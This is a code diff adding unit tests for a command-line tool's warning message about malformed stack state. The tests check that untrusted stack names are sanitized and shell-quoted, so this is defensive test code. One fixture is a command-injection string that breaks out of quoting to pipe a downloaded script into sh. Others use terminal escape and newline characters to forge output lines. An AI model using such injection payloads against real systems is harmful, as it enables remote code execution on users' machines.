@@ -5,11 +5,15 @@ import { dirname, join } from 'node:path';
 import {
   STATE_RESOURCES_MALFORMED,
   hasReadableResources,
+  isReadableBag,
+  malformedRenderedContainersWarning,
   malformedResourcesWarning,
   malformedStateRefusalMessage,
   refuseMalformedState,
   repairMalformedResourcesForReadOnly,
+  type RenderedStateContainer,
 } from '../../../src/state/malformed-resources-bag.js';
+import { UNRENDERABLE } from '../../../src/utils/display-safe.js';
 import { CdkdError } from '../../../src/utils/error-handler.js';
 import type { StackState } from '../../../src/types/state.js';
 
@@ -327,6 +331,100 @@ describe('the user-facing text', () => {
       'the finding is raised BELOW `options.fail`, so ScrubNeededError (exit 1, silent) fires ' +
         'first and reports "scrub found a leak" for a record scrub could not read.'
     ).toBeLessThan(branch.indexOf('if (options.fail)'));
+  });
+});
+
+describe('isReadableBag is the ONE predicate (issue go-to-k/cdkd#3187)', () => {
+  it('agrees with hasReadableResources on every shape, so the two cannot drift', () => {
+    // The extraction's whole point: `cdkd state show` needed the same test for
+    // four more containers, and a second spelling would be free to disagree
+    // with this one. The comparison is over the same table the rest of this
+    // file uses, plus the readable shapes — a predicate agreeing only where it
+    // says NO is half a fence.
+    for (const [label, value] of [
+      ...UNREADABLE,
+      ['an empty object', {}] as const,
+      ['a populated object', { A: 1 }] as const,
+    ]) {
+      expect(isReadableBag(value), label).toBe(hasReadableResources(state(value)));
+    }
+  });
+});
+
+describe('the rendered-container warning (issue go-to-k/cdkd#3187)', () => {
+  const CONTAINERS: readonly RenderedStateContainer[] = [
+    'outputs',
+    'skippedOutputs',
+    'attributes',
+    'properties',
+  ];
+
+  it('renders both identifiers exactly as its sibling messages do, and ends on the command', () => {
+    // A planted stack name that would close the quoting and append its own
+    // command to the line this text tells the user to RUN. A stack name reaches
+    // these paths from an S3 key, so it is not trusted.
+    const evil = "a'; curl http://x|sh; echo '";
+    const w = malformedRenderedContainersWarning(evil, 'us-east-1', ['outputs']);
+    const sibling = malformedResourcesWarning(evil, 'us-east-1');
+
+    // The command is LAST and UNWRAPPED here — an outer `'...'` would compose
+    // with `shellQuote`'s own quoting into something unpastable.
+    const start = w.indexOf('cdkd state show ');
+    expect(start).toBeGreaterThan(-1);
+    const command = w.slice(start);
+    expect(w.endsWith(command)).toBe(true);
+    expect(command.endsWith('--json')).toBe(true);
+
+    // ...and BYTE-IDENTICAL to the command the sibling message builds from the
+    // same inputs. That is the assertion that cannot rot: it pins the shared
+    // sanitize-then-shell-quote path rather than re-spelling `shellQuote`'s
+    // output here, where a hand-written expectation would have to be revised —
+    // and could be revised WRONG — every time that helper changes.
+    expect(sibling).toContain(command);
+    // The planted text never appears unquoted.
+    expect(command).not.toContain(`show ${evil} `);
+  });
+
+  it('keeps a control-bearing identifier on ONE line, so it cannot forge a row', () => {
+    const w = malformedRenderedContainersWarning(
+      `Evil${String.fromCharCode(0x1b)}[31m\nStack: Decoy`,
+      'us-east-1',
+      ['outputs']
+    );
+    expect(w.split('\n')).toHaveLength(1);
+    expect(w).not.toContain(String.fromCharCode(0x1b));
+  });
+
+  it('renders an identifier that sanitizes to EMPTY as a placeholder', () => {
+    // Never as nothing: an empty argument makes `--stack-region` swallow the
+    // next flag, turning the remedy into a differently-broken command.
+    //
+    // Built from escapes rather than written as literal bytes: a raw control
+    // character makes `grep` and `rg` treat the whole file as BINARY and skip
+    // it, so every grep-based audit stops seeing this suite. Enforced by
+    // `tests/unit/scripts/source-control-bytes.test.ts`, which is what caught
+    // the first cut of this case.
+    const controlOnly = String.fromCharCode(0x00, 0x01);
+    const w = malformedRenderedContainersWarning(controlOnly, 'us-east-1', ['outputs']);
+    expect(w).toContain(UNRENDERABLE);
+  });
+
+  it('names the containers in the order it was given, quoted', () => {
+    const w = malformedRenderedContainersWarning('S', 'us-east-1', CONTAINERS);
+    expect(w).toContain(`'outputs', 'skippedOutputs', 'attributes', 'properties'`);
+  });
+
+  it('sanitizes a container NAME too, so the closed union is not the only guard', () => {
+    // The union is closed at COMPILE time and the sole caller sources its names
+    // from a module constant, so nothing can reach this today. That is exactly
+    // why it is worth a case: the guarantee would otherwise live in a comment,
+    // and the day a caller derives a name from a record the forged element
+    // would render verbatim and could forge a line. Cast, because the type is
+    // what this case is deliberately reaching around.
+    const forged = `x\nStack: Decoy` as RenderedStateContainer;
+    const w = malformedRenderedContainersWarning('S', 'us-east-1', [forged]);
+    expect(w.split('\n')).toHaveLength(1);
+    expect(w).not.toContain('\nStack: Decoy');
   });
 });
 
